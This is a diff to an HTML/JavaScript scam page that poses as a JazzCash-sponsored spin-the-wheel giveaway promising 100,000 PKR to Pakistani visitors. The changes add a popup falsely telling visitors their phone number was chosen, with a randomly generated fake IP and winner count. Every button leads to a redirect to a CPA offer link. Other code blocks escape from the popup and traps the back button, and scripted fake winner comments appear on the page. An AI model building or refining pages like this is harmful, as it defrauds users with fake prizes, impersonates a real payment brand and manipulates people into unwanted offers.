@@ -51,18 +51,9 @@
     }
 
     @keyframes floatParticle {
-      0% {
-        transform: translateY(0px) translateX(0px) scale(1);
-        opacity: 0.3;
-      }
-      50% {
-        opacity: 0.7;
-        transform: translateY(-40px) translateX(15px) scale(0.9);
-      }
-      100% {
-        transform: translateY(-10px) translateX(-15px) scale(0.4);
-        opacity: 0.1;
-      }
+      0% { transform: translateY(0px) translateX(0px) scale(1); opacity: 0.3; }
+      50% { opacity: 0.7; transform: translateY(-40px) translateX(15px) scale(0.9); }
+      100% { transform: translateY(-10px) translateX(-15px) scale(0.4); opacity: 0.1; }
     }
 
     .main-container {
@@ -171,6 +162,7 @@
       width: 300px;
       height: 300px;
       margin: 10px auto 24px;
+      cursor: pointer;
     }
     
     @media (max-width: 360px) {
@@ -201,25 +193,42 @@
       border-top: 36px solid #ffffff;
       filter: drop-shadow(0 4px 8px rgba(0,0,0,0.8));
       z-index: 20;
+      pointer-events: none;
     }
     .center-gift {
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      width: 52px;
-      height: 52px;
+      width: 60px;
+      height: 60px;
       background: #1a1a1a;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 30px;
-      filter: grayscale(100%);
-      box-shadow: 0 0 20px rgba(255,255,255,0.5);
-      z-index: 15;
-      border: 2px solid #555;
-      pointer-events: none;
+      font-size: 32px;
+      filter: grayscale(0%);
+      box-shadow: 0 0 25px rgba(255,215,0,0.7), 0 0 50px rgba(0,0,0,0.8);
+      z-index: 25;
+      border: 3px solid #FFD700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      animation: giftPulse 2s infinite;
+    }
+    
+    .center-gift:hover {
+      transform: translate(-50%, -50%) scale(1.1);
+      box-shadow: 0 0 40px rgba(255,215,0,0.9);
+    }
+    
+    .center-gift:active {
+      transform: translate(-50%, -50%) scale(0.95);
+    }
+    
+    @keyframes giftPulse {
+      0%, 100% { box-shadow: 0 0 25px rgba(255,215,0,0.7); }
+      50% { box-shadow: 0 0 45px rgba(255,215,0,1); }
     }
 
     .spin-btn {
@@ -395,7 +404,7 @@
     
     .popup-box {
       background: linear-gradient(145deg, #1a1a1a, #0a0a0a);
-      padding: 36px 28px;
+      padding: 32px 24px;
       border-radius: 32px;
       text-align: center;
       max-width: 420px;
@@ -408,38 +417,29 @@
     }
     
     @keyframes popIn {
-      0% { 
-        transform: scale(0.2) rotate(-10deg); 
-        opacity: 0; 
-      }
-      60% { 
-        transform: scale(1.05) rotate(2deg); 
-        opacity: 1; 
-      }
-      100% { 
-        transform: scale(1) rotate(0deg); 
-        opacity: 1; 
-      }
+      0% { transform: scale(0.2) rotate(-10deg); opacity: 0; }
+      60% { transform: scale(1.05) rotate(2deg); opacity: 1; }
+      100% { transform: scale(1) rotate(0deg); opacity: 1; }
     }
     
     .popup-box h3 {
       color: #FFD700;
-      font-size: 24px;
-      margin-bottom: 20px;
+      font-size: 22px;
+      margin-bottom: 16px;
       line-height: 1.5;
       text-shadow: 0 0 20px rgba(255,215,0,0.5);
     }
     
     .popup-box .user-info {
       color: #fff;
-      font-size: 15px;
-      margin-bottom: 24px;
-      padding: 16px;
+      font-size: 14px;
+      margin-bottom: 20px;
+      padding: 14px;
       background: rgba(255,255,255,0.08);
       border-radius: 16px;
       display: flex;
       flex-direction: column;
-      gap: 10px;
+      gap: 8px;
       border: 1px solid rgba(255,215,0,0.2);
     }
     
@@ -447,14 +447,14 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
+      gap: 8px;
       font-weight: 500;
     }
     
     .popup-box p {
       color: #fff;
-      font-size: 17px;
-      margin-bottom: 24px;
+      font-size: 16px;
+      margin-bottom: 20px;
       line-height: 1.5;
       font-weight: 500;
     }
@@ -462,7 +462,7 @@
     .popup-buttons {
       display: flex;
       flex-direction: column;
-      gap: 16px;
+      gap: 14px;
       align-items: center;
       width: 100%;
     }
@@ -470,7 +470,7 @@
     .popup-claim-btn {
       background: linear-gradient(135deg, #FFD700, #FFA500);
       border: none;
-      padding: 16px 44px;
+      padding: 16px 40px;
       border-radius: 30px;
       font-weight: 700;
       color: #000;
@@ -495,7 +495,7 @@
     
     .yes-no-container {
       display: flex;
-      gap: 20px;
+      gap: 16px;
       justify-content: center;
       width: 100%;
       max-width: 280px;
@@ -539,7 +539,7 @@
     }
     
     .device-icon {
-      font-size: 28px;
+      font-size: 24px;
     }
     
     .popup-badge {
@@ -548,7 +548,7 @@
       color: #000;
       padding: 6px 16px;
       border-radius: 20px;
-      font-size: 13px;
+      font-size: 12px;
       font-weight: 700;
       margin: 8px 0;
       animation: pulseBadge 1.5s infinite;
@@ -557,6 +557,36 @@
     @keyframes pulseBadge {
       0%, 100% { transform: scale(1); }
       50% { transform: scale(1.05); }
+    }
+    
+    .popup-note {
+      font-size: 13px;
+      color: #aaa;
+      margin-top: 12px;
+      line-height: 1.4;
+    }
+    
+    .money-image {
+      font-size: 80px;
+      margin: 16px 0;
+      animation: floatMoney 2s ease-in-out infinite;
+    }
+    
+    @keyframes floatMoney {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    .jazzcash-sponsored {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 12px;
+      font-size: 13px;
+      color: #FFD700;
+      font-weight: 600;
+      letter-spacing: 0.5px;
     }
   </style>
 </head>
@@ -571,7 +601,7 @@
          alt="JazzCash"
          style="background: transparent;"
          onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 200 60\'%3E%3Cdefs%3E%3Cstyle%3E.text%7Bfont-family:Arial,sans-serif;font-weight:bold;font-size:28px;fill:%23e2001a;%7D%3C/style%3E%3C/defs%3E%3Ctext x=\'10\' y=\'42\' class=\'text\'%3EJazz%3C/text%3E%3Ctext x=\'82\' y=\'42\' class=\'text\' fill=\'%23ffffff\'%3ECash%3C/text%3E%3C/svg%3E'">
-    <span class="brand-text">JAZZCASH</span>
+    <span class="brand-text">Official Partner</span>
   </div>
 
   <div class="hero">
@@ -584,11 +614,11 @@
     </div>
   </div>
 
-  <!-- wheel -->
-  <div class="wheel-container">
+  <!-- wheel with clickable center gift box -->
+  <div class="wheel-container" id="wheelContainer">
     <div class="pointer"></div>
     <canvas id="wheelCanvas" width="300" height="300"></canvas>
-    <div class="center-gift">🎁</div>
+    <div class="center-gift" id="centerGift" title="Click to Spin!">🎁</div>
   </div>
 
   <button class="spin-btn" id="spinButton">⚡ TAP TO SPIN</button>
@@ -638,13 +668,15 @@
 
 <script>
   (function() {
-    // ----- CPA OFFER LINK (replace with actual) -----
+    // ----- CPA OFFER LINK -----
     const CPA_LINK = "https://example.com/cpa-offer";
 
     // ----- DOM elements -----
     const canvas = document.getElementById('wheelCanvas');
     const ctx = canvas.getContext('2d');
     const spinBtn = document.getElementById('spinButton');
+    const centerGift = document.getElementById('centerGift');
+    const wheelContainer = document.getElementById('wheelContainer');
     const claimedSpan = document.getElementById('claimedCount');
     const viewingSpan = document.getElementById('viewingNow');
     const recentSpan = document.getElementById('recentWinners');
@@ -697,6 +729,7 @@
     }
 
     const deviceInfo = getDeviceInfo();
+    const selectedCount = Math.floor(Math.random() * 500) + 1500;
 
     // wheel segments
     const segments = [
@@ -716,6 +749,7 @@
     let currentRotation = 0;
     let slowRotationAnimationId = null;
     let isSlowRotating = true;
+    let initialPopupShown = false;
 
     function drawWheel(rotation = 0) {
       ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -831,7 +865,7 @@
       confettiEffect();
       
       setTimeout(() => {
-        showClaimPopup();
+        showWinClaimPopup();
       }, 600);
     }
 
@@ -874,13 +908,78 @@
       document.body.style.overflow = 'hidden';
     }
 
-    function enablePageInteractions() {
-      document.body.classList.remove('popup-active');
-      mainContainer.classList.remove('popup-disabled');
-      document.body.style.overflow = '';
+    // INITIAL POPUP
+    function showInitialPopup() {
+      if (initialPopupShown) return;
+      initialPopupShown = true;
+      
+      disablePageInteractions();
+      
+      popupContent.innerHTML = `
+        <h3>📱 YEAH! Your phone number<br>has been chosen!</h3>
+        <div class="user-info">
+          <span>🌐 <strong>IP:</strong> 192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}</span>
+          <span><span class="device-icon">${deviceInfo.deviceIcon}</span> <strong>Device:</strong> ${deviceInfo.deviceType}</span>
+          <span>🇵🇰 <strong>Country:</strong> Pakistan</span>
+        </div>
+        <span class="popup-badge">⭐ SELECTED WINNER ⭐</span>
+        <p style="color:#FFD700; font-weight:bold; margin-top:8px;">Claim 100,000 PKR</p>
+        <p class="popup-note">You are 1 among ${selectedCount} selected today</p>
+        <div class="popup-buttons">
+          <div class="yes-no-container">
+            <button class="popup-yes-btn" id="initialYesBtn">✓ YES</button>
+            <button class="popup-no-btn" id="initialNoBtn">✗ NO</button>
+          </div>
+        </div>
+      `;
+      popupOverlay.classList.add('active');
+      
+      document.getElementById('initialYesBtn').addEventListener('click', () => {
+        showPhoneConfirmationPopup();
+      });
+      
+      document.getElementById('initialNoBtn').addEventListener('click', () => {
+        popupContent.innerHTML = `
+          <h3>⚠️ Are you sure?</h3>
+          <p>You will lose your chance to claim 100,000 PKR!</p>
+          <p class="popup-note">This is a limited time offer</p>
+          <div class="popup-buttons">
+            <button class="popup-claim-btn" id="reconsiderBtn">CLAIM MY REWARD 💰</button>
+          </div>
+        `;
+        
+        document.getElementById('reconsiderBtn').addEventListener('click', () => {
+          showPhoneConfirmationPopup();
+        });
+      });
     }
 
-    function showClaimPopup() {
+    // PHONE CONFIRMATION POPUP (no input, direct redirect)
+    function showPhoneConfirmationPopup() {
+      popupContent.innerHTML = `
+        <div class="jazzcash-sponsored">
+          <img src="https://banner2.cleanpng.com/lnd/20250110/pw/d0ad8bb55bc068ecf2058516429406.webp" 
+               style="height:24px; mix-blend-mode:screen;" 
+               alt="JazzCash"
+               onerror="this.style.display='none'">
+          Sponsored by JazzCash
+        </div>
+        <h3>📱 Confirm Your Phone Number</h3>
+        <div class="money-image">💵</div>
+        <p style="color:#FFD700; font-weight:bold;">Claim Your 100,000 PKR</p>
+        <div class="popup-buttons">
+          <button class="popup-claim-btn" id="confirmPhoneBtn">📞 Confirm Phone Number</button>
+        </div>
+        <p class="popup-note">Powered by JazzCash - Pakistan's #1 Mobile Wallet</p>
+      `;
+      
+      document.getElementById('confirmPhoneBtn').addEventListener('click', () => {
+        window.location.href = CPA_LINK;
+      });
+    }
+
+    // WIN + CLAIM POPUP (after spinning)
+    function showWinClaimPopup() {
       disablePageInteractions();
       
       popupContent.innerHTML = `
@@ -891,7 +990,7 @@
           <span>🌐 <strong>Browser:</strong> ${deviceInfo.browserName}</span>
         </div>
         <span class="popup-badge">⭐ VERIFIED WINNER ⭐</span>
-        <p style="color:#FFD700; font-weight:bold; margin-top:12px;">Claim your Rs 100,000 reward now!</p>
+        <p style="color:#FFD700; font-weight:bold; margin-top:8px;">Claim 100,000 PKR</p>
         <div class="popup-buttons">
           <button class="popup-claim-btn" id="popupClaimBtn">💰 CLAIM NOW</button>
           <div class="yes-no-container">
@@ -903,11 +1002,11 @@
       popupOverlay.classList.add('active');
       
       document.getElementById('popupClaimBtn').addEventListener('click', () => {
-        window.location.href = CPA_LINK;
+        showPhoneConfirmationPopup();
       });
       
       document.getElementById('popupYesBtn').addEventListener('click', () => {
-        window.location.href = CPA_LINK;
+        showPhoneConfirmationPopup();
       });
       
       document.getElementById('popupNoBtn').addEventListener('click', () => {
@@ -916,7 +1015,6 @@
           <div class="user-info">
             <span><span class="device-icon">${deviceInfo.deviceIcon}</span> <strong>Device:</strong> ${deviceInfo.deviceType}</span>
             <span>🇵🇰 <strong>Country:</strong> Pakistan</span>
-            <span>🌐 <strong>Browser:</strong> ${deviceInfo.browserName}</span>
           </div>
           <p>Complete the last step to get your reward</p>
           <div class="popup-buttons">
@@ -925,11 +1023,12 @@
         `;
         
         document.getElementById('noCompleteBtn').addEventListener('click', () => {
-          window.location.href = CPA_LINK;
+          showPhoneConfirmationPopup();
         });
       });
     }
 
+    // Block escape routes
     popupOverlay.addEventListener('click', (e) => {
       if (e.target === popupOverlay) {
         e.stopPropagation();
@@ -957,9 +1056,21 @@
       history.pushState(null, '', window.location.href);
     }
 
+    // Spin triggers
     spinBtn.addEventListener('click', spinWheel);
+    
+    centerGift.addEventListener('click', (e) => {
+      e.stopPropagation();
+      spinWheel();
+    });
+    
+    wheelContainer.addEventListener('click', (e) => {
+      if (e.target === wheelContainer || e.target === canvas) {
+        spinWheel();
+      }
+    });
 
-    // Dynamic counters - ONLY INCREASING
+    // Dynamic counters
     let baseClaimed = 1847;
     let baseViewing = 47;
     let baseWinners = 12;
@@ -1060,11 +1171,16 @@
     drawWheel(currentRotation);
     startSlowRotation();
     
+    // Show initial popup after short delay
+    setTimeout(() => {
+      showInitialPopup();
+    }, 1500);
+    
     // Initial comments
-    setTimeout(() => addFakeComment("Just won Rs 100,000! Unbelievable! 🎉"), 1500);
-    setTimeout(() => addFakeComment("It's real guys! Got my money 💰"), 3000);
-    setTimeout(() => addFakeComment("Spinned and won Rs 70,000! 😍"), 4500);
-    setTimeout(() => addFakeComment("Pakistan Zindabad! Won big! 🇵🇰"), 6000);
+    setTimeout(() => addFakeComment("Just won Rs 100,000! Unbelievable! 🎉"), 3000);
+    setTimeout(() => addFakeComment("It's real guys! Got my money 💰"), 4500);
+    setTimeout(() => addFakeComment("Spinned and won Rs 70,000! 😍"), 6000);
+    setTimeout(() => addFakeComment("Pakistan Zindabad! Won big! 🇵🇰"), 7500);
   })();
 </script>
 </body>
